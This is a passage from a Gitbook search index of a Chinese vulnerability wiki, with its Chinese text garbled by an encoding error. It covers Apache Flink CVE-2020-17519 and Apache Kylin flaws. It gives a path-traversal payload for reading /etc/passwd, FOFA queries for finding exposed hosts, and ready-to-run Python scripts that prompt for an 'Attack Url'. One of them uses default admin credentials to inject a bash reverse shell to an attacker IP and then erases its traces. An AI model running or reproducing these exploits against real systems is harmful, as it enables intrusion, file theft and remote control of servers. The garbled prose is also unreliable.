"},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Flink/Apache Flink ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û CVE-2020-17519.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Flink/Apache Flink ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û CVE-2020-17519.html","title":"Apache Flink ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û CVE-2020-17519","keywords":"","body":"Apache Flink ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û CVE-2020-17519 ÊºèÊ¥ûÊèèËø∞ 2021Âπ¥01Êúà06Êó•Ôºå360CERTÁõëÊµãÂèëÁé∞Apache FlinkÂèëÂ∏É‰∫ÜApache Flink ÁõÆÂΩïÁ©øË∂äÊºèÊ¥û,ÁõÆÂΩïÁ©øË∂äÊºèÊ¥ûÁöÑÈ£éÈô©ÈÄöÂëäÔºåÊºèÊ¥ûÁºñÂè∑‰∏∫CVE-2020-17518,CVE-2020-17519ÔºåÊºèÊ¥ûÁ≠âÁ∫ßÔºöÈ´òÂç±ÔºåÊºèÊ¥ûËØÑÂàÜÔºö8.5„ÄÇ ËøúÁ®ãÊîªÂáªËÄÖÈÄöËøáREST APIÁõÆÂΩïÈÅçÂéÜÔºåÂèØÈÄ†ÊàêÊñá‰ª∂ËØªÂèñ/ÂÜôÂÖ•ÁöÑÂΩ±Âìç„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Apache Flink 1.11.0 Apache Flink 1.11.1 Apache Flink 1.11.2 FOFA [!NOTE] app=\"Apache Flink\" ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519 ÊºèÊ¥ûÂ§çÁé∞ POC: http://xxx.xxx.xxx.xxx/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd ÊºèÊ¥ûÂà©Áî®POC import requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Apache Flink 1.11.0-1.11.2 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 CVE-2020-17519.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mFile >>> /etc/passwd \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): file_name = file_name.replace(\"/\", \"%252f\") vuln_url = target_url + \"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}\".format(file_name) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] ËØ∑Ê±ÇURL Ôºö {}\\033[0m\".format(vuln_url)) if \"root\" in response.text: print(\"\\033[32m[o] ÁõÆÊ†á {} Â≠òÂú®ÊºèÊ¥û,ÊàêÂäüËØªÂèñ /etc/passwd ÔºåÂìçÂ∫î‰∏∫:\\n{}\\033[0m\".format(target_url, response.text)) else : print(\"\\033[31m[x] ÁõÆÊ†áUrlÊºèÊ¥ûÂà©Áî®Â§±Ë¥•\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†áUrlÊºèÊ¥ûÂà©Áî®Â§±Ë¥•\\033[0m\") sys.exit(0) def POC_2(target_url, file_name): file_name_re = file_name.replace(\"/\", \"%252f\") vuln_url = target_url + \"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}\".format(file_name_re) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] ËØ∑Ê±ÇURL Ôºö {}\\033[0m\".format(vuln_url)) if \"error\" not in response.text: print(\"\\033[32m[o] ÁõÆÊ†á {} Â≠òÂú®ÊºèÊ¥û,ÊàêÂäüËØªÂèñ {} ÔºåÂìçÂ∫î‰∏∫:\\n{}\\033[0m\".format(target_url, file_name, response.text)) else : print(\"\\033[31m[x] ÁõÆÊ†áÊñá‰ª∂{}ËØªÂèñÂ§±Ë¥•\\033[0m\".format(file_name)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†áUrlÊºèÊ¥ûÂà©Áî®Â§±Ë¥•\\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = \"/etc/passwd\" POC_1(target_url, file_name) while True: file_name = input(\"\\033[35mFile >>> \\033[0m\") if file_name == \"exit\": sys.exit(0) else: POC_2(target_url, file_name) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Kylin/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Kylin/","title":"Apache Kylin","keywords":"","body":"Apache Kylin Apache Kylin Console ÊéßÂà∂Âè∞Âº±Âè£‰ª§ Apache kylin Êú™ÊéàÊùÉÈÖçÁΩÆÊ≥ÑÈú≤ CVE-2020-13937 Apache Kylin ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-1956 Apache Kylin ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-13925 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Kylin/Apache Kylin Console ÊéßÂà∂Âè∞Âº±Âè£‰ª§.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Kylin/Apache Kylin Console ÊéßÂà∂Âè∞Âº±Âè£‰ª§.html","title":"Apache Kylin Console ÊéßÂà∂Âè∞Âº±Âè£‰ª§","keywords":"","body":"Apache Kylin Console ÊéßÂà∂Âè∞Âº±Âè£‰ª§ ÊºèÊ¥ûÊèèËø∞ Apache Kylin Console ÊéßÂà∂Âè∞Â≠òÂú®ÈªòËÆ§Âº±Âè£‰ª§ adminÔºöKYLINÔºåÂèØË¢´ÁôªÂΩïÊéßÂà∂Âè∞Ëøõ‰∏ÄÊ≠•Âà©Áî®ÂÖ∂‰ªñÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Apache Kylin ÊºèÊ¥ûÂ§çÁé∞ ÊâìÂºÄÂêéÁõÆÊ†áÁ´ôÁÇπ‰ΩøÁî®ÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Åadmin/KYLINÁôªÂΩïÔºåÂá∫Áé∞ÂàùÂßãÁïåÈù¢Âç≥‰∏∫ÊàêÂäü Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Apache_Kylin_Console_Default_password.json Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Kylin/Apache Kylin Êú™ÊéàÊùÉÈÖçÁΩÆÊ≥ÑÈú≤ CVE-2020-13937.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Kylin/Apache Kylin Êú™ÊéàÊùÉÈÖçÁΩÆÊ≥ÑÈú≤ CVE-2020-13937.html","title":"Apache Kylin Êú™ÊéàÊùÉÈÖçÁΩÆÊ≥ÑÈú≤ CVE-2020-13937","keywords":"","body":"Apache KylinÁöÑÊú™ÊéàÊùÉÈÖçÁΩÆÊ≥ÑÈú≤ CVE-2020-13937 ÊºèÊ¥ûÊèèËø∞ Apache KylinÊúâ‰∏Ä‰∏™restful api‰ºöÂú®Ê≤°Êúâ‰ªª‰ΩïËÆ§ËØÅÁöÑÊÉÖÂÜµ‰∏ãÊö¥Èú≤ÈÖçÁΩÆ‰ø°ÊÅØ„ÄÇ FOFA [!NOTE] app=\"APACHE-kylin\" ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Apahche Kylin 2.x.x Apahche Kylin Apahche Kylin 4.0.0-alpha ÊºèÊ¥ûÂ§çÁé∞ Ê†πÊçÆÊºèÊ¥ûÊÉÖÊä• ÊºèÊ¥ûÂà©Áî®POC‰∏∫ http://xxx.xxx.xxx.xxx/kylin/api/admin/config ÊºèÊ¥ûÊ£ÄÊµãPOC import requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Apache Kylin 2.x.x >> http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/kylin/api/admin/config\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"config\" in response.text: print(\"\\033[32m[o] Â≠òÂú®Apache KylinÁöÑÊú™ÊéàÊùÉÈÖçÁΩÆÊ≥ÑÈú≤\\n[o] ÂìçÂ∫î‰∏∫:\\n\\033[0m\",response.text) else: print(\"\\033[31m[x] ÁõÆÊ†áUrlÊºèÊ¥ûÂà©Áî®Â§±Ë¥•\\033[0m\") except: print(\"\\033[31m[x] ÁõÆÊ†áUrlÊºèÊ¥ûÂà©Áî®Â§±Ë¥•\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby && POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Apache_Kylin_Unauthorized_configuration_disclosure.json ÂèÇËÄÉ CVE-2020-13937|Apache KylinÁöÑÊú™ÊéàÊùÉÈÖçÁΩÆÊ≥ÑÈú≤ÊºèÊ¥ûÔºåËÖæËÆØÂÆâÂÖ®ÂÖ®Èù¢ÊîØÊåÅÊ£ÄÊµã Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Kylin/Apache Kylin ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-1956.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Kylin/Apache Kylin ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-1956.html","title":"Apache Kylin ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-1956","keywords":"","body":"Apache Kylin ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-1956 ÊºèÊ¥ûÊèèËø∞ 2020Âπ¥5Êúà22Êó•ÔºåCNVD ÈÄöÊä•‰∫Ü Apache Kylin Â≠òÂú®ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-1956ÔºåÂú∞ÂùÄÂú® http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202005-1133 „ÄÇ Apache Kylin ÊòØÁæéÂõΩ Apache ËΩØ‰ª∂Âü∫Èáë‰ºöÁöÑ‰∏ÄÊ¨æÂºÄÊ∫êÁöÑÂàÜÂ∏ÉÂºèÂàÜÊûêÂûãÊï∞ÊçÆ‰ªìÂ∫ì„ÄÇËØ•‰∫ßÂìÅ‰∏ªË¶ÅÊèê‰æõ Hadoop/Spark ‰πã‰∏äÁöÑ SQL Êü•ËØ¢Êé•Âè£ÂèäÂ§öÁª¥ÂàÜÊûêÔºàOLAP**ÔºâÁ≠âÂäüËÉΩ„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1 ÁéØÂ¢ÉÊê≠Âª∫ ËøôÈáå‰ΩøÁî® docker Êù•Êê≠Âª∫ÈúÄË¶ÅÁöÑÁéØÂ¢É KylinÂÆòÊñπÊñáÊ°£ docker pull apachekylin/apache-kylin-standalone:3.0.1 [!NOTE] Â¶ÇÊûúÊúçÂä°Âô®ÂÜÖÂ≠òËæÉÂ∞èÔºåÂèØ‰∏çÈÄâÊã© -m 8G ÂèÇÊï∞ docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 ÊâìÂºÄÂêé‰ΩøÁî®ÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Åadmin/KYLINÁôªÂΩïÔºåÂá∫Áé∞ÂàùÂßãÁïåÈù¢Âç≥‰∏∫ÊàêÂäü ÊºèÊ¥ûÂàÜÊûê Êü•ÁúãËøô‰∏™ÊºèÊ¥û‰øÆÂ§çÁöÑË°•‰∏Å Êü•ÁúãÂú∞ÂùÄ ËøôÈáåÂèØ‰ª•ÁúãÂà∞Ê≠§ÊºèÊ¥ûÊúâÂÖ≥ÁöÑÂèÇÊï∞Êúâ‰∏â‰∏™ÔºåÂàÜÂà´ÊòØ srcCfgUri„ÄÅdstCfgUri„ÄÅprojectNameÔºåÁõ∏ÂÖ≥ÁöÑÂáΩÊï∞‰∏∫ migrateCube ÂÆòÊñπÊñáÊ°£‰∏≠ÂØπ migrateCube ÁöÑÊèèËø∞ POST /kylin/api/cubes/{cube}/{project}/migrate ‰∏ãËΩΩ Apache Kylin 3.0.1 ÁöÑÊ∫ê‰ª£Á†ÅËøõË°å‰ª£Á†ÅÂÆ°ËÆ°,Âá∫Áé∞ÊºèÊ¥ûÂáΩÊï∞ÁöÑÊñá‰ª∂‰∏∫‰ª•‰∏ãË∑ØÂæÑ apache-kylin-3.0.1\\server-base\\src\\main\\java\\org\\apache\\kylin\\rest\\service\\CubeService.java ÊâæÂà∞migrateCubeÂáΩÊï∞ @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\") public void migrateCube(CubeInstance cube, String projectName) { KylinConfig config = cube.getConfig(); if (!config.isAllowAutoMigrateCube()) { throw new InternalErrorException(\"One click migration is disabled, please contact your ADMIN\"); } for (CubeSegment segment : cube.getSegments()) { if (segment.getStatus() != SegmentStatusEnum.READY) { throw new InternalErrorException( \"At least one segment is not in READY state. Please check whether there are Running or Error jobs.\"); } } String srcCfgUri = config.getAutoMigrateCubeSrcConfig(); String dstCfgUri = config.getAutoMigrateCubeDestConfig(); Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\"); Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\"); String stringBuilderstringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\"); String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri, cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge()); logger.info(\"One click migration cmd: \" + cmd); CliCommandExecutor exec = new CliCommandExecutor(); PatternedLogger patternedLogger = new PatternedLogger(logger); try { exec.execute(cmd, patternedLogger); } catch (IOException e) { throw new InternalErrorException(\"Failed to perform one-click migrating\", e); } } PreAuthorizeÈáåÈù¢ÂÆö‰πâ‰∫ÜË∑ØÁî±ÊùÉÈôêÔºåADMINÊùÉÈôê„ÄÅADMINISTRATIONÊùÉÈôêÂíåMANAGEMENTÊùÉÈôêÂèØ‰ª•ËÆøÈóÆËØ•service„ÄÇ @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\") Âú®1087Ë°åÂà§Êñ≠ÊòØÂê¶ÂºÄÂêØ‰∫ÜMigrateCubeËÆæÁΩÆÔºåÂ¶ÇÊûúÊ≤°ÊúâÂºÄÂêØÂàô‰ºöÊä•Èîô Ë∑üËøõ isAllowAutoMigrateCube() Ëøô‰∏™ÂáΩÊï∞ ÂèØ‰ª•ÁúãÂà∞ËøôÈáåÈªòËÆ§ÁöÑÈÖçÁΩÆkylin.tool.auto-migrate-cube.enabled Â∞±ÊòØFlase public boolean isAllowAutoMigrateCube() { return Boolean.parseBoolean(getOptional(\"kylin.tool.auto-migrate-cube.enabled\", FALSE)); } Âú®Ê≤°ÊúâÂºÄÂêØÈÖçÁΩÆkylin.tool.auto-migrate-cube.enabled‰∏∫trueÁöÑÊÉÖÂÜµ‰∏ãÔºåË∞ÉÁî®MigrateCubeÂàô‰ºöÂá∫Áé∞Êä•Èîô ÈÄöËøáApache KylinÁöÑSYSTEMÊ®°ÂùóÂºÄÂêØkylin.tool.auto-migrate-cube.enabled‰∏∫True ËÆæÁΩÆÂêéÂÜçÂéªËØ∑Ê±ÇÂàô‰∏ç‰ºöÂá∫Áé∞ÂàöÂàöÁöÑÊä•ÈîôÔºåËÄåÊòØÂá∫Áé∞Source configuration should not be empty Ë∑üËøõÂá∫Áé∞Êä•ÈîôËØ≠Âè•ÁöÑ‰ª£Á†ÅÂùó String srcCfgUri = config.getAutoMigrateCubeSrcConfig(); String dstCfgUri = config.getAutoMigrateCubeDestConfig(); Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\"); Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\"); ËøôÈáåËøõË°å‰∫ÜÂØπkylin.tool.auto-migrate-cube.src-configÂíåkylin.tool.auto-migrate-cube.dest-configÁöÑÈÖçÁΩÆËøõË°å‰∫ÜÊ£ÄÊµã ,Â¶ÇÊûú‰∏∫Á©∫Âàô‰ºöÂá∫Áé∞ÂàöÂàöÁöÑÊä•Èîô Ë∑üËøõ getAutoMigrateCubeSrcConfig()ÂíågetAutoMigrateCubeDestConfig()ÂáΩÊï∞ public String getAutoMigrateCubeSrcConfig() { return getOptional(\"kylin.tool.auto-migrate-cube.src-config\", \"\"); } public String getAutoMigrateCubeDestConfig() { return getOptional(\"kylin.tool.auto-migrate-cube.dest-config\", \"\"); } ÂèëÁé∞Ëøô‰∏§‰∏™ÈÖçÁΩÆÈªòËÆ§‰∏∫Á©∫ÔºåÂõ†‰∏∫ÈÖçÁΩÆÂÖÅËÆ∏Ëá™ÂÆö‰πâÔºåÊâÄ‰ª•srcCfgUriÂíådstCfgUri‰∏§‰∏™ÂèòÈáèÂùáÊòØÂèØÊéßÁöÑ ÁªßÁª≠Âêë‰∏ãËµ∞ÔºåÂèëÁé∞‰∏ÄÂ§ÑÂëΩ‰ª§ÊãºÊé• String stringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\"); String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri, cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge()); logger.info(\"One click migration cmd: \" + cmd); CliCommandExecutor exec = new CliCommandExecutor(); PatternedLogger patternedLogger = new PatternedLogger(logger); try { exec.execute(cmd, patternedLogger); } catch (IOException e) { throw new InternalErrorException(\"Failed to perform one-click migrating\", e); } } ËøõÂÖ•Âà∞executeÂáΩÊï∞ private Pair runRemoteCommand(String command, Logger logAppender) throws IOException { SSHClient ssh = new SSHClient(remoteHost, port, remoteUser, remotePwd); SSHClientOutput sshOutput; try { sshOutput = ssh.execCommand(command, remoteTimeoutSeconds, logAppender); int exitCode = sshOutput.getExitCode(); String output = sshOutput.getText(); return Pair.newPair(exitCode, output); } catch (IOException e) { throw e; } catch (Exception e) { throw new IOException(e.getMessage(), e); } } private Pair runNativeCommand(String command, Logger logAppender) throws IOException { String[] cmd = new String[3]; String osName = System.getProperty(\"os.name\"); if (osName.startsWith(\"Windows\")) { cmd[0] = \"cmd.exe\"; cmd[1] = \"/C\"; } else { cmd[0] = \"/bin/bash\"; cmd[1] = \"-c\"; } cmd[2] = command; ProcessBuilder builder = new ProcessBuilder(cmd); builder.redirectErrorStream(true); Process proc = builder.start(); BufferedReader reader = new BufferedReader( new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8)); String line; StringBuilder result = new StringBuilder(); while ((line = reader.readLine()) != null && !Thread.currentThread().isInterrupted()) { result.append(line).append('\\n'); if (logAppender != null) { logAppender.log(line); } } if (Thread.interrupted()) { logger.info(\"CliCommandExecutor is interruppted by other, kill the sub process: \" + command); proc.destroy(); try { Thread.sleep(1000); } catch (InterruptedException e) { // do nothing } return Pair.newPair(1, \"Killed\"); } try { int exitCode = proc.waitFor(); return Pair.newPair(exitCode, result.toString()); } catch (InterruptedException e) { Thread.currentThread().interrupt(); throw new IOException(e); } } } Áî±Ê≠§ÂèØ‰ª•ÂæóÂá∫Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáËøô‰∏§‰∏™ÂèØÊéßÁöÑÂèÇÊï∞ÔºåÊâßË°å‰ªªÊÑèÊàë‰ª¨ÈúÄË¶ÅÁöÑÂëΩ‰ª§Ôºå‰æãÂ¶ÇÂèçÂºπ‰∏Ä‰∏™shellÔºåËÆæÁΩÆÁöÑÈÖçÁΩÆ‰∏∫ [!NOTE] kylin.tool.auto-migrate-cube.enabled=true kylin.tool.auto-migrate-cube.src-config=echo;bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 kylin.tool.auto-migrate-cube.dest-config=shell ÂÜçÂéªÂèëÈÄÅPOSTËØ∑Ê±Ç /kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate ÊàêÂäüÂèçÂºπ‰∏Ä‰∏™shell ÊºèÊ¥ûÂà©Áî®POC [!NOTE] POCÂà©Áî®ÂâçÊèêÊòØÊã•ÊúâË¥¶Âè∑ÂØÜÁ†ÅÔºåÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†ÅÊòØ admin/KYLIN #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Apache Kylin >> http://xxx.xxx.xxx.xxx:7070 \\033[0m') print('+ \\033[36mLogin >>> admin:KYLIN(Ê†ºÂºè‰∏∫User:Pass) \\033[0m') print('+------------------------------------------') def POC_1(target_url): login_url = target_url + \"/kylin/api/user/authentication\" user_pass = str(input(\"\\033[35mPlease input User and Pass\\nLogin >>> \\033[0m\")) Authorization = \"Basic \" + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8') headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Cookie\": \"project=null\" } try: response = requests.post(url=login_url, headers=headers, timeout=20) if \"password\" not in response.text: print(\"\\033[31m[x] Ë¥¶Âè∑ÂØÜÁ†ÅÂá∫Áé∞ÈîôËØØ \\033[0m\") sys.exit(0) else: print(\"\\033[32m[o] ÊàêÂäüÁôªÂΩïÔºåËé∑ÂæóJSESSIONIDÔºö\" + response.cookies[\"JSESSIONID\"] + \"\\033[0m\") return response.cookies[\"JSESSIONID\"],Authorization except: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥•\\033[0m\") sys.exit(0) def POC_2(target_url, cookie, IP, PORT, Authorization): config_url = target_url + \"/kylin/api/admin/config\" key = [\"kylin.tool.auto-migrate-cube.enabled\",\"kylin.tool.auto-migrate-cube.src-config\",\"kylin.tool.auto-migrate-cube.dest-config\"] value = [\"true\",\"echo;bash -i >& /dev/tcp/{}/{} 0>&1;echo\".format(IP, PORT), \"shell\"] headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Accept\": \"application/json, text/plain, */*\", \"Content-Type\": \"application/json;charset=UTF-8\", \"Pragma\": \"no-cache\", \"Cookie\": \"project=null;JSESSIONID=\"+cookie } for i in range(0,3): data = \"\"\"{\"key\":\"%s\",\"value\":\"%s\"}\"\"\" % (key[i], value[i]) try: response = requests.put(url=config_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] ÊàêÂäüÂ∞Ü\" + key[i] +\"ËÆæÁΩÆ‰∏∫\" + value[i] +\"\\033[0m\") else: print(\"\\033[31m[x] ËÆæÁΩÆ\" + key[i] +\"‰∏∫\" + value[i] +\"Â§±Ë¥•\\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥• \\033[0m\") sys.exit(0) def POC_3(target_url, cookie): print(\"\\033[35m[o] Ê≠£Âú®ÂèçÂºπshell......\\033[0m\") vuln_url = target_url + \"/kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } try: response = requests.post(url=vuln_url, headers=headers) POC_4(target_url, cookie) except: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥• \\033[0m\") sys.exit(0) def POC_4(target_url, cookie): config_url = target_url + \"/kylin/api/admin/config\" key = [\"kylin.tool.auto-migrate-cube.enabled\", \"kylin.tool.auto-migrate-cube.src-config\", \"kylin.tool.auto-migrate-cube.dest-config\"] value = [\"flase\", \"echo;echo;echo\", \"None\"] headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Accept\": \"application/json, text/plain, */*\", \"Content-Type\": \"application/json;charset=UTF-8\", \"Pragma\": \"no-cache\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } for i in range(0,3): data = \"\"\"{\"key\":\"%s\",\"value\":\"%s\"}\"\"\" % (key[i], value[i]) try: response = requests.put(url=config_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] ÊàêÂäüÂ∞Ü\" + key[i] +\"ËÆæÁΩÆ‰∏∫\" + value[i] +\"\\033[0m\") else: print(\"\\033[31m[x] ËÆæÁΩÆ\" + key[i] +\"‰∏∫\" + value[i] +\"Â§±Ë¥•\\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥• \\033[0m\") sys.exit(0) print(\"\\033[35m[o] ÊàêÂäüÊ∏ÖÁêÜÁóïËøπ\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) try: cookie,Authorization = POC_1(target_url) except: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥• \\033[0m\") sys.exit(0) IP = str(input(\"\\033[35mËØ∑ËæìÂÖ•ÁõëÂê¨IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mËØ∑ËæìÂÖ•ÁõëÂê¨PORT >>> \\033[0m\")) POC_2(target_url, cookie, IP, PORT, Authorization) POC_3(target_url, cookie) ÂèÇËÄÉÊñáÁ´† Apache Kylin ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û CVE-2020-1956 POC ÂàÜÊûê Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by 